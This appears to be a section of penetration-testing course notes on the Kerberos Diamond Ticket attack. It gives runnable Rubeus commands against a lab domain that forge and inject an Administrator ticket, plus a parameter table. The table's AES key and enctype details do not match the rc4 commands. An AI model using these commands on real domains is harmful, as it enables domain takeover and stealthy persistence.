# 8.3 - Diamond Ticket

#### Diamond Ticket (TGT Modification Attack)

A **Diamond Ticket** is a modified version of a legitimate **TGT (Ticket Granting Ticket)**. Unlike Golden Tickets, which are completely forged from scratch, Diamond Tickets are based on **real TGTs** that are **decrypted, modified, and re-encrypted** using the **krbtgt account key**.

***

#### Key Characteristics

* A **Diamond Ticket** is a **TGT modification attack**, whereas a Golden Ticket is a **TGT forgery attack**.
* A legitimate TGT is **captured and decrypted**, its content (e.g., username, groups) is modified, and then it is **re-encrypted** with the **krbtgt AES key**.
* The ticket will have **valid timestamps**, since they are inherited from a real DC-issued ticket.
* More stealthy than Golden Tickets because:
  * TGT appears **genuinely issued by the DC**.
  * TGS requests based on this ticket **match** an actual TGT.
  * Less detectable by SIEMs and monitoring tools.
* Persistence duration depends on **TGT lifetime** and **krbtgt key rotation policy**.

#### Forge a Diamond Ticket with Credentials

You can use **Rubeus** to create a Diamond Ticket using the **krbtgt AES key** and the credentials of a domain user:

```powershell
Rubeus.exe diamond /krbkey:d7ac4db5b820be57cc79f58f196a0e5b /user:devan /password:new_password123 /enctype:rc4 /ticketuser:Administrator /domain:dev-angelist.lab /dc:corp-dc.dev-angelist.lab /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

***

#### Forge a Diamond Ticket Using `/tgtdeleg`

If you already have a **TGT delegation token** (captured via `Rubeus tgtdeleg`), you can generate a Diamond Ticket **without needing user credentials**:

```powershell
Rubeus.exe diamond /krbkey:d7ac4db5b820be57cc79f58f196a0e5b /tgtdeleg /enctype:rc4 /ticketuser:Administrator /domain:dev-angelist.lab /dc:corp-dc.dev-angelist.lab /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

#### Parameters Explained

| Option                             | Description                                                               |
| ---------------------------------- | ------------------------------------------------------------------------- |
| `/diamond`                         | Rubeus module for crafting a Diamond Ticket.                              |
| `/krbkey:<key>`                    | AES256 key of the `krbtgt` account (required for re-encryption).          |
| `/user:studentx` + `/password:...` | Domain user credentials to request the real TGT.                          |
| `/tgtdeleg`                        | Uses a captured TGT delegation token instead of user credentials.         |
| `/ticketuser:administrator`        | User to impersonate in the new ticket.                                    |
| `/ticketuserid:500`                | RID of the impersonated user (default 500 = Administrator).               |
| `/groups:512`                      | Groups the impersonated user should be a member of.                       |
| `/domain`, `/dc`                   | Target domain and Domain Controller.                                      |
| `/enctype:aes`                     | Encryption type (must match the krbtgt key used).                         |
| `/createnetonly:<path>`            | Creates a netonly logon session to isolate the context (e.g., spawn cmd). |
| `/show`                            | Displays the forged ticket before injection.                              |
| `/ptt`                             | Injects the forged ticket into the current session.                       |
